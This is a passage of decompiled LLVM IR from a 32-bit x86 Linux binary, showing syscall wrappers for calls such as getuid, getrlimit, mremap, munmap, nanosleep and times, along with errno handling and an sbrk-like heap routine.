316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 22, 333, 334, 335, 336, 327, 328, 329, 330, 27, 337, 338, 339, 340, 26, 345, 346, 347, 348, 37, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 341, 342, 343, 344, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 28, 374, 375, 376, 38, 377, 378, 379, 380, 381, 382, 383, 385, 384, 5, 386, 387, 388, 389, 390, 391, 392, 393, 25, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 36, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 21, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 30, 29, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 31, 457, 458, 459, 460, 461, 462, 463, 32, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 33, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 34, 484, 485, 35, 486, 487, 488, 489, 490, 491, 492, 493, 494, 24, 39, 495, 496, 497, 498, 499, 500, 501, 40, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 41, 601, 602, 603, 604, 605, 606, 607, 608, 42, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 23, 626, 627, 628 }
  uselistorder i32 15, { 4, 3, 9, 1, 0, 2, 5, 6, 7, 8 }
  uselistorder i32 -16, { 14, 46, 136, 137, 19, 20, 66, 67, 68, 69, 47, 48, 51, 15, 56, 57, 62, 63, 64, 65, 58, 59, 54, 18, 52, 17, 49, 50, 60, 61, 21, 70, 71, 72, 73, 55, 53, 16, 22, 23, 74, 75, 24, 25, 77, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 133, 94, 93, 45, 92, 2, 104, 3, 27, 38, 120, 28, 105, 33, 31, 107, 32, 1, 26, 103, 29, 106, 30, 4, 12, 43, 44, 122, 11, 123, 124, 39, 40, 121, 41, 125, 42, 108, 5, 109, 34, 110, 35, 111, 6, 112, 7, 113, 114, 8, 115, 116, 9, 117, 118, 36, 119, 10, 37, 126, 127, 95, 96, 97, 98, 99, 100, 101, 102, 128, 129, 130, 131, 138, 0, 132, 13, 134, 135 }
  uselistorder i32 30, { 6, 4, 2, 1, 5, 3, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054ffd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054ff8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054f5a, { 1, 0 }
}

define i32 @function_8055005() local_unnamed_addr {
dec_label_pc_8055005:
  %stack_var_-8 = alloca i32, align 4
  %v2_8055008 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805500f = call i32 @function_80550af(i32 7, i32 %v2_8055008)
  store i32 256, i32* @edx, align 4
  %v2_805501c = icmp slt i32 %v2_805500f, 0
  br i1 %v2_805501c, label %dec_label_pc_8055024, label %dec_label_pc_8055020

dec_label_pc_8055020:                             ; preds = %dec_label_pc_8055005
  %v3_8055020 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8055020, i32* @edx, align 4
  br label %dec_label_pc_8055024

dec_label_pc_8055024:                             ; preds = %dec_label_pc_8055005, %dec_label_pc_8055020
  %v0_8055024 = phi i32 [ 256, %dec_label_pc_8055005 ], [ %v3_8055020, %dec_label_pc_8055020 ]
  ret i32 %v0_8055024

; uselistorder directives
  uselistorder i32 7, { 7, 17, 0, 1, 3, 8, 4, 9, 5, 10, 6, 11, 19, 20, 18, 21, 22, 23, 14, 12, 15, 16, 24, 25, 13, 26, 27, 2 }
  uselistorder label %dec_label_pc_8055024, { 1, 0 }
}

define i32 @function_805502a() local_unnamed_addr {
dec_label_pc_805502a:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805502a = load i32, i32* @ebx, align 4
  store i32 %v0_805502a, i32* %stack_var_-4, align 4
  %v1_8055033 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8055033, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8055033, -4095
  br i1 %tmp7, label %dec_label_pc_805504a, label %dec_label_pc_805503e

dec_label_pc_805503e:                             ; preds = %dec_label_pc_805502a
  %v1_805503e = call i32 @function_80530b9(i32 %v0_805502a)
  %v0_8055043 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055043 = sub i32 0, %v0_8055043
  %v2_8055045 = inttoptr i32 %v1_805503e to i32*
  store i32 %v1_8055043, i32* %v2_8055045, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805504e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805504a

dec_label_pc_805504a:                             ; preds = %dec_label_pc_805502a, %dec_label_pc_805503e
  %v2_805504e = phi i32 [ %v0_805502a, %dec_label_pc_805502a ], [ %v2_805504e.pre, %dec_label_pc_805503e ]
  %v0_805504a = phi i32 [ %v1_8055033, %dec_label_pc_805502a ], [ -1, %dec_label_pc_805503e ]
  store i32 %v2_805504e, i32* @ebx, align 4
  ret i32 %v0_805504a

; uselistorder directives
  uselistorder i32 %v1_8055033, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805504a, { 1, 0 }
}

define i32 @function_8055050() local_unnamed_addr {
dec_label_pc_8055050:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055050 = load i32, i32* @ebx, align 4
  store i32 %v0_8055050, i32* %stack_var_-4, align 4
  %v1_8055059 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8055059, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8055059, -4095
  br i1 %tmp7, label %dec_label_pc_8055070, label %dec_label_pc_8055064

dec_label_pc_8055064:                             ; preds = %dec_label_pc_8055050
  %v1_8055064 = call i32 @function_80530b9(i32 %v0_8055050)
  %v0_8055069 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055069 = sub i32 0, %v0_8055069
  %v2_805506b = inttoptr i32 %v1_8055064 to i32*
  store i32 %v1_8055069, i32* %v2_805506b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055074.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055070

dec_label_pc_8055070:                             ; preds = %dec_label_pc_8055050, %dec_label_pc_8055064
  %v2_8055074 = phi i32 [ %v0_8055050, %dec_label_pc_8055050 ], [ %v2_8055074.pre, %dec_label_pc_8055064 ]
  %v0_8055070 = phi i32 [ %v1_8055059, %dec_label_pc_8055050 ], [ -1, %dec_label_pc_8055064 ]
  store i32 %v2_8055074, i32* @ebx, align 4
  ret i32 %v0_8055070

; uselistorder directives
  uselistorder i32 %v1_8055059, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055070, { 1, 0 }
}

define i32 @function_8055076() local_unnamed_addr {
dec_label_pc_8055076:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055076 = load i32, i32* @ebx, align 4
  store i32 %v0_8055076, i32* %stack_var_-4, align 4
  %v1_805507f = call i32 @int80_syscall(i32 200)
  store i32 %v1_805507f, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805507f, -4095
  br i1 %tmp7, label %dec_label_pc_8055096, label %dec_label_pc_805508a

dec_label_pc_805508a:                             ; preds = %dec_label_pc_8055076
  %v1_805508a = call i32 @function_80530b9(i32 %v0_8055076)
  %v0_805508f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805508f = sub i32 0, %v0_805508f
  %v2_8055091 = inttoptr i32 %v1_805508a to i32*
  store i32 %v1_805508f, i32* %v2_8055091, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805509a.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055096

dec_label_pc_8055096:                             ; preds = %dec_label_pc_8055076, %dec_label_pc_805508a
  %v2_805509a = phi i32 [ %v0_8055076, %dec_label_pc_8055076 ], [ %v2_805509a.pre, %dec_label_pc_805508a ]
  %v0_8055096 = phi i32 [ %v1_805507f, %dec_label_pc_8055076 ], [ -1, %dec_label_pc_805508a ]
  store i32 %v2_805509a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055096

; uselistorder directives
  uselistorder i32 %v1_805507f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055096, { 1, 0 }
}

define i32 @function_805509c() local_unnamed_addr {
dec_label_pc_805509c:
  %v0_805509c = load i32, i32* @global_var_80572c4.239, align 4
  %v1_80550a6 = icmp eq i32 %v0_805509c, 0
  br i1 %v1_80550a6, label %dec_label_pc_80550ac, label %dec_label_pc_80550aa

dec_label_pc_80550aa:                             ; preds = %dec_label_pc_805509c
  br label %dec_label_pc_80550ac

dec_label_pc_80550ac:                             ; preds = %dec_label_pc_805509c, %dec_label_pc_80550aa
  %storemerge = phi i32 [ %v0_805509c, %dec_label_pc_80550aa ], [ 4096, %dec_label_pc_805509c ]
  %v0_80550ac = phi i32 [ %v0_805509c, %dec_label_pc_80550aa ], [ 4096, %dec_label_pc_805509c ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_80550ac

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 11, 12, 2, 7, 5, 6, 8, 9, 10, 3, 4 }
  uselistorder label %dec_label_pc_80550ac, { 1, 0 }
}

define i32 @function_80550af(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80550af:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80550af = load i32, i32* @ebx, align 4
  store i32 %v0_80550af, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80550c2 = call i32 @int80_syscall(i32 191)
  store i32 %v1_80550c2, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80550c2, -4095
  br i1 %tmp9, label %dec_label_pc_80550db, label %dec_label_pc_80550cf

dec_label_pc_80550cf:                             ; preds = %dec_label_pc_80550af
  %v1_80550cf = call i32 @function_80530b9(i32 %v0_80550af)
  %v0_80550d4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80550d4 = sub i32 0, %v0_80550d4
  %v2_80550d6 = inttoptr i32 %v1_80550cf to i32*
  store i32 %v1_80550d4, i32* %v2_80550d6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80550df.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80550db

dec_label_pc_80550db:                             ; preds = %dec_label_pc_80550af, %dec_label_pc_80550cf
  %v2_80550df = phi i32 [ %v0_80550af, %dec_label_pc_80550af ], [ %v2_80550df.pre, %dec_label_pc_80550cf ]
  %v0_80550db = phi i32 [ %v1_80550c2, %dec_label_pc_80550af ], [ -1, %dec_label_pc_80550cf ]
  store i32 %v2_80550df, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80550db

; uselistorder directives
  uselistorder i32 %v1_80550c2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80550db, { 1, 0 }
}

define i32 @function_80550e1() local_unnamed_addr {
dec_label_pc_80550e1:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80550e1 = load i32, i32* @ebx, align 4
  store i32 %v0_80550e1, i32* %stack_var_-4, align 4
  %v1_80550ea = call i32 @int80_syscall(i32 199)
  store i32 %v1_80550ea, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80550ea, -4095
  br i1 %tmp7, label %dec_label_pc_8055101, label %dec_label_pc_80550f5

dec_label_pc_80550f5:                             ; preds = %dec_label_pc_80550e1
  %v1_80550f5 = call i32 @function_80530b9(i32 %v0_80550e1)
  %v0_80550fa = load i32, i32* %ebx.global-to-local, align 4
  %v1_80550fa = sub i32 0, %v0_80550fa
  %v2_80550fc = inttoptr i32 %v1_80550f5 to i32*
  store i32 %v1_80550fa, i32* %v2_80550fc, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055105.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055101

dec_label_pc_8055101:                             ; preds = %dec_label_pc_80550e1, %dec_label_pc_80550f5
  %v2_8055105 = phi i32 [ %v0_80550e1, %dec_label_pc_80550e1 ], [ %v2_8055105.pre, %dec_label_pc_80550f5 ]
  %v0_8055101 = phi i32 [ %v1_80550ea, %dec_label_pc_80550e1 ], [ -1, %dec_label_pc_80550f5 ]
  store i32 %v2_8055105, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055101

; uselistorder directives
  uselistorder i32 %v1_80550ea, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055101, { 1, 0 }
}

define i32 @function_8055107(i32 %arg1) local_unnamed_addr {
dec_label_pc_8055107:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_805511d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805511d, i32* %esi.global-to-local, align 4
  %v1_8055134 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8055134, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8055134, -4095
  br i1 %tmp18, label %dec_label_pc_805514e, label %dec_label_pc_8055140

dec_label_pc_8055140:                             ; preds = %dec_label_pc_8055107
  %v2_8055121 = ashr i32 %tmp8, 31
  %v1_8055140 = call i32 @function_80530b9(i32 %v2_8055121)
  %v0_8055145 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055145 = sub i32 0, %v0_8055145
  %v2_8055147 = inttoptr i32 %v1_8055140 to i32*
  store i32 %v1_8055145, i32* %v2_8055147, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055152

dec_label_pc_805514e:                             ; preds = %dec_label_pc_8055107
  %v1_805514e = icmp eq i32 %v1_8055134, 0
  br i1 %v1_805514e, label %dec_label_pc_8055157, label %dec_label_pc_8055152

dec_label_pc_8055152:                             ; preds = %dec_label_pc_805514e, %dec_label_pc_8055140
  %v0_8055152 = phi i32 [ %v1_8055134, %dec_label_pc_805514e ], [ -1, %dec_label_pc_8055140 ]
  %v1_8055154 = ashr i32 %v0_8055152, 31
  br label %dec_label_pc_805515f

dec_label_pc_8055157:                             ; preds = %dec_label_pc_805514e
  %v3_8055157 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805515f

dec_label_pc_805515f:                             ; preds = %dec_label_pc_8055152, %dec_label_pc_8055157
  %v0_8055165 = phi i32 [ %v0_8055152, %dec_label_pc_8055152 ], [ %v3_8055157, %dec_label_pc_8055157 ]
  %storemerge = phi i32 [ %v1_8055154, %dec_label_pc_8055152 ], [ %tmp, %dec_label_pc_8055157 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8055165

; uselistorder directives
  uselistorder i32 %v1_8055134, { 1, 2, 0, 3 }
  uselistorder i32 31, { 9, 10, 6, 1, 2, 3, 4, 7, 5, 8, 0, 11 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805515f, { 1, 0 }
}

define i32 @function_8055166(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8055166:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8055167 = load i32, i32* @esi, align 4
  store i32 %v0_8055167, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805517f = load i32, i32* @ebx, align 4
  %v5_8055187 = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_8055187 = ptrtoint i32* %v5_8055187 to i32
  store i32 %v0_805517f, i32* @ebx, align 4
  store i32 %v6_8055187, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_8055187, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_8055193, label %dec_label_pc_805519f

dec_label_pc_8055193:                             ; preds = %dec_label_pc_8055166
  %v1_8055193 = call i32 @function_80530b9(i32 %v0_805517f)
  %v0_8055198 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055198 = sub i32 0, %v0_8055198
  %v2_805519a = inttoptr i32 %v1_8055193 to i32*
  store i32 %v1_8055198, i32* %v2_805519a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80551a2.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805519f

dec_label_pc_805519f:                             ; preds = %dec_label_pc_8055166, %dec_label_pc_8055193
  %v2_80551a2 = phi i32 [ %v0_8055167, %dec_label_pc_8055166 ], [ %v2_80551a2.pre, %dec_label_pc_8055193 ]
  %v0_805519f = phi i32 [ %v6_8055187, %dec_label_pc_8055166 ], [ -1, %dec_label_pc_8055193 ]
  %v2_80551a1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80551a1, i32* @edx, align 4
  store i32 %v2_80551a2, i32* @esi, align 4
  ret i32 %v0_805519f

; uselistorder directives
  uselistorder i32 %v0_805517f, { 1, 0 }
  uselistorder label %dec_label_pc_805519f, { 1, 0 }
}

define i32 @function_80551a5(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80551a5:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80551a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80551a5, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_80551b8 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_80551b8, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_80551b8, -4095
  br i1 %tmp10, label %dec_label_pc_80551d1, label %dec_label_pc_80551c5

dec_label_pc_80551c5:                             ; preds = %dec_label_pc_80551a5
  %v1_80551c5 = call i32 @function_80530b9(i32 %v0_80551a5)
  %v0_80551ca = load i32, i32* %ebx.global-to-local, align 4
  %v1_80551ca = sub i32 0, %v0_80551ca
  %v2_80551cc = inttoptr i32 %v1_80551c5 to i32*
  store i32 %v1_80551ca, i32* %v2_80551cc, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80551d5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80551d1

dec_label_pc_80551d1:                             ; preds = %dec_label_pc_80551a5, %dec_label_pc_80551c5
  %v2_80551d5 = phi i32 [ %v0_80551a5, %dec_label_pc_80551a5 ], [ %v2_80551d5.pre, %dec_label_pc_80551c5 ]
  %v0_80551d1 = phi i32 [ %v3_80551b8, %dec_label_pc_80551a5 ], [ -1, %dec_label_pc_80551c5 ]
  %v2_80551d3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80551d3, i32* @edx, align 4
  store i32 %v2_80551d5, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80551d1

; uselistorder directives
  uselistorder i32 %v3_80551b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80551d1, { 1, 0 }
}

define i32 @function_80551d7(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80551d7:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80551d7 = load i32, i32* @ebx, align 4
  store i32 %v0_80551d7, i32* %stack_var_-4, align 4
  %v4_80551db = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_80551db, i32* %ebx.global-to-local, align 4
  %v6_80551ea = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_80551ea, i32* %ebx.global-to-local, align 4
  %tmp12 = icmp ult i32 %v6_80551ea, -4095
  br i1 %tmp12, label %dec_label_pc_8055203, label %dec_label_pc_80551f7

dec_label_pc_80551f7:                             ; preds = %dec_label_pc_80551d7
  %v1_80551f7 = call i32 @function_80530b9(i32 %v0_80551d7)
  %v0_80551fc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80551fc = sub i32 0, %v0_80551fc
  %v2_80551fe = inttoptr i32 %v1_80551f7 to i32*
  store i32 %v1_80551fc, i32* %v2_80551fe, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055207.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055203

dec_label_pc_8055203:                             ; preds = %dec_label_pc_80551d7, %dec_label_pc_80551f7
  %v2_8055207 = phi i32 [ %v0_80551d7, %dec_label_pc_80551d7 ], [ %v2_8055207.pre, %dec_label_pc_80551f7 ]
  %v0_8055203 = phi i32 [ %v6_80551ea, %dec_label_pc_80551d7 ], [ -1, %dec_label_pc_80551f7 ]
  %v2_8055205 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055205, i32* @edx, align 4
  store i32 %v2_8055207, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055203

; uselistorder directives
  uselistorder i32 %v6_80551ea, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055203, { 1, 0 }
}

define i32 @function_8055209(i32 %arg1) local_unnamed_addr {
dec_label_pc_8055209:
  %stack_var_-12 = alloca i32, align 4
  %v0_805520a = load i32, i32* @ebx, align 4
  %v0_805520e = load i32, i32* @global_var_80572d8.246, align 8
  %v1_805520e = icmp eq i32 %v0_805520e, 0
  %v1_8055219 = icmp eq i1 %v1_805520e, false
  br i1 %v1_8055219, label %dec_label_pc_805522c, label %dec_label_pc_805521b

dec_label_pc_805521b:                             ; preds = %dec_label_pc_8055209
  %v1_8055220 = call i32 @function_80553cf(i32 0)
  %v2_8055228 = icmp slt i32 %v1_8055220, 0
  br i1 %v2_8055228, label %dec_label_pc_805524e, label %dec_label_pc_805521b.dec_label_pc_805522c_crit_edge

dec_label_pc_805521b.dec_label_pc_805522c_crit_edge: ; preds = %dec_label_pc_805521b
  %v0_805522e.pre = load i32, i32* @global_var_80572d8.246, align 8
  br label %dec_label_pc_805522c

dec_label_pc_805522c:                             ; preds = %dec_label_pc_805521b.dec_label_pc_805522c_crit_edge, %dec_label_pc_8055209
  %v0_805523c = phi i32 [ %v0_805522e.pre, %dec_label_pc_805521b.dec_label_pc_805522c_crit_edge ], [ %v0_805520e, %dec_label_pc_8055209 ]
  %v1_805522c = icmp eq i32 %arg1, 0
  %v1_8055233 = icmp eq i1 %v1_805522c, false
  br i1 %v1_8055233, label %dec_label_pc_8055239, label %dec_label_pc_8055235

dec_label_pc_8055235:                             ; preds = %dec_label_pc_805522c
  br label %dec_label_pc_8055251

dec_label_pc_8055239:                             ; preds = %dec_label_pc_805522c
  store i32 %v0_805523c, i32* @ebx, align 4
  %v2_805523e = add i32 %v0_805523c, %arg1
  %v1_8055242 = call i32 @function_80553cf(i32 %v2_805523e)
  %v2_805524a = icmp slt i32 %v1_8055242, 0
  %v1_805524c = icmp eq i1 %v2_805524a, false
  br i1 %v1_805524c, label %dec_label_pc_8055239.dec_label_pc_8055251_crit_edge, label %dec_label_pc_805524e

dec_label_pc_8055239.dec_label_pc_8055251_crit_edge: ; preds = %dec_label_pc_8055239
  %v0_8055251.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055251

dec_label_pc_805524e:                             ; preds = %dec_label_pc_8055239, %dec_label_pc_805521b
  br label %dec_label_pc_8055251

dec_label_pc_8055251:                             ; preds = %dec_label_pc_8055239.dec_label_pc_8055251_crit_edge, %dec_label_pc_8055235, %dec_label_pc_805524e
  %v0_8055251 = phi i32 [ %v0_8055251.pre, %dec_label_pc_8055239.dec_label_pc_8055251_crit_edge ], [ %v0_805523c, %dec_label_pc_8055235 ], [ -1, %dec_label_pc_805524e ]
  %v2_8055253 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055253, i32* @edx, align 4
  store i32 %v0_805520a, i32* @ebx, align 4
  ret i32 %v0_8055251

; uselistorder directives
  uselistorder i32 %v0_805523c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_80553cf, { 1, 0 }
  uselistorder label %dec_label_pc_8055251, { 2, 0, 1 }
}

define i32 @function_8055257(%tms* %arg1) local_unnamed_addr {
dec_label_pc_8055257:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055257 = load i32, i32* @edi, align 4
  store i32 %v0_8055257, i32* %stack_var_-4, align 4
  %v4_805525b = ptrtoint %tms* %arg1 to i32
  store i32 %v4_805525b, i32* %edi.global-to-local, align 4
  %v0_805525f = load i32, i32* @ebx, align 4
  %v3_8055267 = call i32 @times(%tms* %arg1)
  store i32 %v3_8055267, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8055267, -4095
  br i1 %tmp10, label %dec_label_pc_805527f, label %dec_label_pc_8055273

dec_label_pc_8055273:                             ; preds = %dec_label_pc_8055257
  %v1_8055273 = call i32 @function_80530b9(i32 %v0_805525f)
  %v0_8055278 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055278 = sub i32 0, %v0_8055278
  %v2_805527a = inttoptr i32 %v1_8055273 to i32*
  store i32 %v1_8055278, i32* %v2_805527a, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8055283.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805527f

dec_label_pc_805527f:                             ; preds = %dec_label_pc_8055257, %dec_label_pc_8055273
  %v2_8055283 = phi i32 [ %v0_8055257, %dec_label_pc_8055257 ], [ %v2_8055283.pre, %dec_label_pc_8055273 ]
  %v0_805527f = phi i32 [ %v3_8055267, %dec_label_pc_8055257 ], [ -1, %dec_label_pc_8055273 ]
  store i32 %v2_8055283, i32* %edi.global-to-local, align 4
  ret i32 %v0_805527f

; uselistorder directives
  uselistorder i32 %v3_8055267, { 1, 0, 2 }
  uselistorder i32* @edi, { 8, 112, 113, 114, 115, 116, 171, 7, 172, 173, 174, 175, 1, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 91, 92, 93, 94, 95, 96, 97, 98, 99, 194, 208, 209, 195, 196, 197, 198, 199, 200, 201, 202, 2, 203, 204, 205, 206, 207, 210, 211, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 9, 130, 131, 212, 213, 132, 133, 134, 135, 10, 214, 215, 11, 216, 217, 218, 219, 136, 3, 137, 138, 18, 19, 20, 21, 56, 57, 58, 59, 60, 61, 62, 63, 49, 50, 51, 22, 23, 24, 25, 26, 64, 65, 66, 37, 38, 39, 12, 13, 14, 34, 35, 36, 40, 41, 42, 43, 44, 45, 46, 47, 68, 69, 70, 55, 71, 72, 73, 52, 15, 16, 17, 67, 27, 28, 29, 30, 31, 32, 33, 48, 53, 54, 74, 75, 76, 77, 78, 79, 0, 6, 90, 80, 81, 82, 83, 84, 85, 86, 87, 89, 88, 4, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 170, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 5, 168, 169, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 242, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805527f, { 1, 0 }
}

define i32 @function_8055285(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055285:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8055286 = load i32, i32* @ebx, align 4
  store i32 %v0_8055286, i32* %stack_var_-8, align 4
  %v4_805528a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805528a, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_8055297 = inttoptr i32 %arg2 to i8*
  %v4_8055297 = call i32 @function_805310a(i8* %v3_8055297, i32 0, i32 88)
  store i32 %v4_8055297, i32* %eax.global-to-local, align 4
  %v2_805529c = load i16, i16* %arg1, align 2
  %v3_805529c = zext i16 %v2_805529c to i32
  store i32 %v3_805529c, i32* %eax.global-to-local, align 4
  %v0_805529f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805529f = add i32 %v0_805529f, 4
